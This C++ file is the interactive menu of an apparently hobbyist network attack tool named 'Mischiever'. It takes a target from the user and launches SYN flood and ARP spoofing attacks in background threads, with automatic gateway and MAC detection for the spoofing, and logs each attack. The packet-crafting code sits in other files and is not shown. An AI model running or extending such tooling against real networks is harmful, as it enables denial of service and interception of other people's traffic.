#include "headers/menu.h"
#include <limits>

// ANSI Colors
#define C_RESET       "\033[0m"
#define C_RED         "\033[1;31m"
#define C_GREEN       "\033[1;32m"
#define C_YELLOW      "\033[1;33m"
#define C_BLUE        "\033[1;34m"
#define C_MAGENTA     "\033[1;35m"
#define C_CYAN        "\033[1;36m"
#define C_BOLD        "\033[1m"

// Constructor
Menu::Menu(Database* database){
    // Initialize database
    this->db = database;
    // Print logo and menu when menu is created
    printLogo();
    printMenu();
}

// Destructor
Menu::~Menu(){}; 

void Menu::printLogo(){
    this->helper.clearScreen();
    std::cout << C_MAGENTA << R"(
    __  ____       __    _                     
   /  |/  (_)_____/ /_  (_)__ _   _____  _____
  / /|_/ / / ___/ __ \/ / _ \ | / / _ \/ ___/
 / /  / / (__  ) /_/ / /  __/ |/ /  __/ /    
/_/  /_/_/____/_.___/_/\___/|___/\___/_/     
                                             
    )" << C_RESET << std::endl;
    std::cout << C_CYAN << "      The Network Swiss Army Knife" << C_RESET << "\n" << std::endl;
    sleep(2);
}

void Menu::printMenu(){
    while(true){
        this->helper.clearScreen();
        std::cout << C_BLUE << "========================================" << C_RESET << std::endl;
        std::cout << C_BOLD << "            MAIN MENU                   " << C_RESET << std::endl;
        std::cout << C_BLUE << "========================================" << C_RESET << std::endl;
        std::cout << C_GREEN << "[1]" << C_RESET << " Attack Modules" << std::endl;
        std::cout << C_GREEN << "[2]" << C_RESET << " Attack History" << std::endl;
        std::cout << C_GREEN << "[3]" << C_RESET << " The Cat" << std::endl;
        std::cout << C_GREEN << "[4]" << C_RESET << " Exit" << std::endl;
        std::cout << std::endl << C_BOLD << "mischiever > " << C_RESET;

        // Get input
        int choice;
        if (!(std::cin >> choice)) {
            std::cin.clear();
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            continue;
        }

        // Handle choice
        switch(choice){
            case 1:
                selectAttackType();
                break;
            case 2:
                // Manage active attacks
                this->db->print_history();
                std::cout << "Press Enter to return...";
                std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
                std::cin.get();
                break;
            case 3:
                funnyCatPicture();
                break;
            case 4:
                exit(0);
                break;
            default:
                std::cout << C_RED << "Invalid choice." << C_RESET << std::endl;
                sleep(1);
                break;
        }
    }
}

void Menu::selectAttackType(){
    bool flag = true;
    while(flag){
        this->helper.clearScreen();
        std::cout << C_BLUE << "========================================" << C_RESET << std::endl;
        std::cout << C_BOLD << "           ATTACK MODULES               " << C_RESET << std::endl;
        std::cout << C_BLUE << "========================================" << C_RESET << std::endl;

        std::string arp_status = this->arp_tool.attacking ? (std::string(C_GREEN) + "RUNNING" + C_RESET) : (std::string(C_RED) + "STOPPED" + C_RESET);

        std::cout << C_GREEN << "[1]" << C_RESET << " SYN Flood" << std::endl;
        std::cout << C_GREEN << "[2]" << C_RESET << " ARP Spoofing [" << arp_status << "]" << std::endl;
        std::cout << C_GREEN << "[3]" << C_RESET << " ICMP Ping Flood" << std::endl;
        std::cout << C_GREEN << "[4]" << C_RESET << " Back" << std::endl;
        std::cout << std::endl << C_BOLD << "mischiever/modules > " << C_RESET;

        // Get input
        int choice;
        if (!(std::cin >> choice)) {
            std::cin.clear();
            std::cin.ignore(std::numeric_limits<std::streamsize>::max(), '\n');
            continue;
        }

        // Handle choice
        switch(choice){
            case 1: {
                std::cout << C_CYAN << "Target IP: " << C_RESET;
                std::string target_ip_str;
                std::cin >> target_ip_str;
                const char* target_ip = target_ip_str.c_str(); // Convert to const char*

                std::cout << C_CYAN << "Target Port: " << C_RESET;
                int target_port;
                std::cin >> target_port;

                std::cout << C_CYAN << "Packet Count: " << C_RESET;
                int packet_count;
                std::cin >> packet_count;

                // Create strings on Heap or pass by value to thread to ensure they survive
                std::string* safe_ip = new std::string(target_ip_str);
                
                // Create the object on the Heap so it survives the scope
                SYN* syn_attack = new SYN(); 

                // Launch thread and Detach
                std::thread t([syn_attack, safe_ip, target_port, packet_count]() {
                    // Run the flood
                    syn_attack->syn_flood(safe_ip->c_str(), target_port, packet_count);
                    
                    // Cleanup memory when done (Self-destruct)
                    delete safe_ip;
                    delete syn_attack;
                });
                
                // 1. Get your real IP
                const char* iface = helper.get_iface();
                std::string my_ip = helper.get_local_ip(iface);
                // 2. Create the source string (e.g., "192.168.37.132 (You)")
                std::string source_log = my_ip + " (You)";
                // 3. Log it
                this->db->log_attack("SYN Flood", source_log, target_ip_str);

                t.detach(); // Allows the menu to keep running while attack happens
                std::cout << C_GREEN << "[+] Attack launched!" << C_RESET << std::endl;
                sleep(1);
                break;
                
            }
            case 2: {
                if (this->arp_tool.attacking) {
                    this->arp_tool.attacking = false;
                    std::cout << C_YELLOW << "\n[!] Stopping Attack..." << C_RESET << std::endl;
                    std::this_thread::sleep_for(std::chrono::seconds(2));
                } 
                else {
                    // 1. Get Interface
                    const char* iface = helper.get_iface();
                    std::string iface_str = std::string(iface);
                    std::cout << C_CYAN << "Interface: " << C_RESET << iface_str << std::endl;

                    // 2. Get Target IP (The ONLY manual input)
                    std::string target_ip_str;
                    std::cout << C_CYAN << "Target IP: " << C_RESET;
                    std::cin >> target_ip_str;

                    // 3. Auto-Detect Gateway IP
                    std::cout << C_YELLOW << "[*] Detecting Gateway IP... " << C_RESET;
                    std::string spoof_ip_str = this->arp_tool.get_default_gateway(iface);
                    if (spoof_ip_str.empty()) {
                        std::cout << C_RED << "Failed! " << C_RESET << "Enter manually: ";
                        std::cin >> spoof_ip_str;
                    } else {
                        std::cout << C_GREEN << spoof_ip_str << " (Found)" << C_RESET << std::endl;
                    }

                    // 4. Auto-Detect Target MAC
                    std::cout << C_YELLOW << "[*] Resolving Target MAC... " << C_RESET;
                    std::string target_mac_str = helper.get_mac_from_ip(target_ip_str);
                    
                    if (target_mac_str.empty()) {
                        std::cout << C_RED << "Failed! " << C_RESET << "Enter MAC manually: ";
                        std::cin >> target_mac_str;
                    } else {
                        std::cout << C_GREEN << target_mac_str << " (Found)" << C_RESET << std::endl;
                    }

                    std::cout << C_GREEN << "\n[+] Launching Stealth Unicast Attack..." << C_RESET << std::endl;

                    // Launch Thread
                    std::thread attack_thread([this, iface_str, target_ip_str, spoof_ip_str, target_mac_str]() {
                        this->arp_tool.send_arp_spoof(iface_str.c_str(), 
                                                    target_ip_str.c_str(), 
                                                    spoof_ip_str.c_str(), 
                                                    target_mac_str.c_str());
                    });

                    // 1. Get your real IP
                    std::string my_ip = helper.get_local_ip(iface);
                    // 2. Create the source string (e.g., "192.168.37.132 (You)")
                    std::string source_log = my_ip + " (You)";
                    // 3. Log it
                    this->db->log_attack("ARP Spoofing", source_log, target_ip_str);

                    attack_thread.detach();
                    sleep(1);
                }
                break;
            }
            case 3: {
                break;
            }
            case 4: {
                // Goes back to menu
                flag = false;
                break;
            }
            default: {
                std::cout << C_RED << "Invalid choice." << C_RESET << std::endl;
                sleep(1);
                break;
            }
        }
    }
}

void Menu::funnyCatPicture(){
    // Display funny cat picture
    this->helper.displayImage("misc/cat.jpg");
}